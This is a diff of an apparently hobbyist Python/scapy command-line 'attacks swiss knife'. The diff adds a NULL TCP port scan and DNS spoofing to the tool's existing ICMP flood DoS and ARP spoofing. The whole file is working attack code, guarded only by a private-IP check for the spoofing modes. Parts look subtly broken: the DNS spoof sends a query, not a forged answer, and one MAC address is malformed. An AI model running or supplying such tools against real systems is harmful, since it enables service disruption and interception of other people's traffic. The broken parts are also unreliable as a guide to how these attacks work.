@@ -1,69 +1,59 @@
-import re
-import socket
-import pythonping
 from scapy.all import *
+import pythonping
+from scapy.layers.dns import DNSQR, DNS
 from scapy.layers.l2 import ARP
+from scapy.layers.inet import TCP, IP, UDP
 
-LOGO = r"""
-  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$              /$$$$$$ /$$$$$$$  /$$$$$$$   /$$$$$$ 
- /$$__  $$ /$$__  $$| $$  | $$| $$$ | $$|__  $$__/| $$_____/| $$__  $$            |_  $$_/| $$__  $$| $$__  $$ /$$__  $$
-| $$  \__/| $$  \ $$| $$  | $$| $$$$| $$   | $$   | $$      | $$  \ $$              | $$  | $$  \ $$| $$  \ $$| $$  \__/
-| $$      | $$  | $$| $$  | $$| $$ $$ $$   | $$   | $$$$$   | $$$$$$$/              | $$  | $$  | $$| $$$$$$$/|  $$$$$$ 
-| $$      | $$  | $$| $$  | $$| $$  $$$$   | $$   | $$__/   | $$__  $$              | $$  | $$  | $$| $$____/  \____  $$
-| $$    $$| $$  | $$| $$  | $$| $$\  $$$   | $$   | $$      | $$  \ $$              | $$  | $$  | $$| $$       /$$  \ $$
-|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$   | $$   | $$$$$$$$| $$  | $$             /$$$$$$| $$$$$$$/| $$      |  $$$$$$/
- \______/  \______/  \______/ |__/  \__/   |__/   |________/|__/  |__/            |______/|_______/ |__/       \______/ 
-""".strip()  # Remove unnecessary newlines
-
-BANNER = f"""\n                                           Welcome to the attacks swiss knife\n\n{LOGO}
-\nDISCLAIMER: Use responsibly and ethically.
-\n――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――\n"""
-
-HELP = """Supported commands:
-- set {target} {ip}
-- attack {ddos|arp}
-- help
-- exit"""
-
-IP_REGEX_PATTERN_STRING: str = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
-IP_REGEX_MATCHER: re.Pattern = re.compile(IP_REGEX_PATTERN_STRING)
+from helper import *
+from banner_generator import print_banner
 
 
-def get_command() -> str:
-    user_command = input("\n> ").lower()
-    return user_command
-
-
-def handle_attack(args: list[str]):
-    if len(args) == 0:
+def handle_attack(args: list[str]) -> None:
+    """
+    Handles different attack types based on user input.
+    :param args: A list of strings representing arguments passed to the script.
+    :return: None
+    """
+    args_num = len(args)
+    if args_num < 2:
         print('Invalid usage, see "help"')
         return
 
+    target = resolve_target(args[1])
+    if target == "":
+        return  # Already prints an error message
+
     match args[0]:
         case "ddos":
-            if len(args) != 2:
+            if args_num != 2:
                 print('Invalid usage, see "help"')
                 return
-            commit_ddos(args[1])
+            commit_ddos(target)
         case "arp":
-            commit_arp_spoofing(args[1])
+            if args_num != 2:
+                print('Invalid usage, see "help"')
+                return
+            commit_arp_spoofing(target)
+        case "tcp" | "portscan":
+            if not 2 <= args_num <= 4:
+                print('Invalid usage, see "help"')
+                return
+            commit_null_tcp_scan(target, *args[2:])
+        case "dns":
+            if args_num != 2:
+                print('Invalid usage, see "help"')
+                return
+            commit_dns_spoofing(target)
         case _:
             print('Attack not supported! Use "help" to learn more')
 
 
-def commit_ddos(target: str):
-    # Determine target and resolve if needed
-    if not IP_REGEX_MATCHER.match(target):
-        try:
-            # Returns: (family, type, proto, canonname, sockaddr)
-            target = socket.getaddrinfo(target, None)[0][-1][0]  # Extract IP
-            print(f"Resolved to {target}")
-        except socket.gaierror:
-            print("Invalid target! Specify a valid IP address or a domain")
-
+def commit_ddos(target: str) -> None:
+    """
+    Performs a DoS attack by flooding the target with ICMP ping requests.
+    :param target: The IP address of the target machine.
+    :return: None
+    """
     print('Committing DoS, press CTRL+C at any moment to stop.')
     try:
         while True:
@@ -76,32 +66,108 @@ def commit_ddos(target: str):
         print("An exception occurred, abandoning attack.")
 
 
-def is_local(ip: str) -> bool:
-    ip_bytes = ip.split('.')
-    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] or (ip_bytes[0] == '172' and 16 <= ip_bytes[1] <= 31)
+def commit_arp_spoofing(target: str) -> None:
+    """
+    Performs ARP spoofing to redirect traffic from the target.
+    :param target: The IP address of the target machine **(must be private)**.
+    :return: None
+    """
+    if not is_local_ip(target):
+        print('Invalid use, please enter a private ip')
+        return
 
-
-def commit_arp_spoofing(target: str):
     def packet_handler(packet):
         arp = packet[ARP]
-        if arp.op != 1 or arp.psrc != target: # Insuring that the packet is relevant
+        # Ensure that the packet is relevant
+        if arp.op != 1 or arp.psrc != target:
             return
         send(ARP(op=2,
-                 psrc=get_if_addr(conf.iface),
+                 psrc=LOCAL_IP,
                  hwsrc='00:00:00:00:00',
                  pdst=target,
                  hwdst=arp.hwsrc
                  ))
 
-    if not is_local(target):
-        print('Invalid use, please enter a private ip')
-        return
     print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
     sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
 
-# Returns whether to continue or not
+def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True) -> None:
+    """
+    Performs a NULL TCP scan to identify open ports on the target.
+    :param target: The IP address of the target machine.
+    :param ports: *(optional)* A comma-separated list of ports to scan. Defaults to 20-80 if unspecified.
+    :param print_closed: *(optional)* A flag indicating whether to print closed ports. Default is true.
+    :return: None
+    """
+    try:
+        port_list = extract_ports(ports)
+    except ValueError:
+        print("Specified ports are invalid!")
+        return
+
+    if not port_list:
+        print("No ports specified, scanning ports 20-80")
+        port_list = range(20, 81)
+
+    print(f'Committing NULL TCP port scanning for {target}')
+    print("┌──────┬─────────┐\n"
+          "│ PORT │  STATE  │\n"
+          "├──────┼─────────┤")
+
+    try:
+        for port in port_list:  # Scan first 1024 ports
+            print(f"\r│ {port:<5}│ ....... │", end="")  # Displays in case port is taking time
+
+            to_send = IP(src=LOCAL_IP, dst=target) / TCP(dport=port)
+            # to_send.show()
+            resp = sr1(to_send, verbose=0, timeout=1)
+
+            if resp:
+                # print(f"flags={resp[TCP].flags} | ", end="")
+                if resp[TCP].flags == 0x14:  # RST
+                    if print_closed:
+                        print(f"\r│ {port:<5}│ closed  │")
+                else:
+                    print(f"\r│ {port:<5}│ open    │")
+            else:
+                print(f"\r│ {port:<5}│ unknown │")
+
+        print("└──────┴─────────┘")
+    except (KeyboardInterrupt, InterruptedError):
+        print("\r└──────┴─────────┘\nAttack Terminated.")
+
+
+def commit_dns_spoofing(target: str) -> None:
+    """
+    Performs DNS spoofing to redirect DNS requests to a different domain.
+    :param target: The IP address of the target machine **(must be private)**.
+    :return: None
+    """
+    if not is_local_ip(target):
+        print('Invalid use, please enter a private ip')
+        return
+
+    BAIT_DOMAIN = "google.com"  # Redirects
+    print(f'Committing DNS Spoofing using bait {BAIT_DOMAIN}')
+
+    def packet_handler(packet):
+        if DNS in packet:
+            ip = IP(dst=target, src=LOCAL_IP)
+            udp = UDP(dport=53, sport=53)  # Send back to 53 (UDP) from a spoofed port
+            dns = DNS(rd=1, qd=DNSQR(qname=BAIT_DOMAIN, qtype="A"))  # Send back a spoofed DNS response
+            to_send = ip/udp/dns  # Join all packet layers
+            send(to_send)
+
+    sniff(prn=packet_handler, promisc=True, store=False, filter="udp port 53")
+
+
 def handle_command(cmd: list[str]) -> bool:
+    """
+    Handles user commands like attack, help, exit, etc.
+    :param cmd: A list of strings representing the user command & arguments.
+    :return: Whether to continue listening to commands (*True*) or to exit (*False*).
+    """
     if len(cmd) == 0:
         print('Command not supported! Use "help" to learn more')
         return True
@@ -120,13 +186,13 @@ def handle_command(cmd: list[str]) -> bool:
 
 
 def main():
-    print(BANNER)
+    print_banner()
     print(HELP)
 
     try:
         while handle_command(get_command().split()):
             pass
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, UnicodeDecodeError):
         print()  # Newline for bye message
 
     print("\nBye bye!")
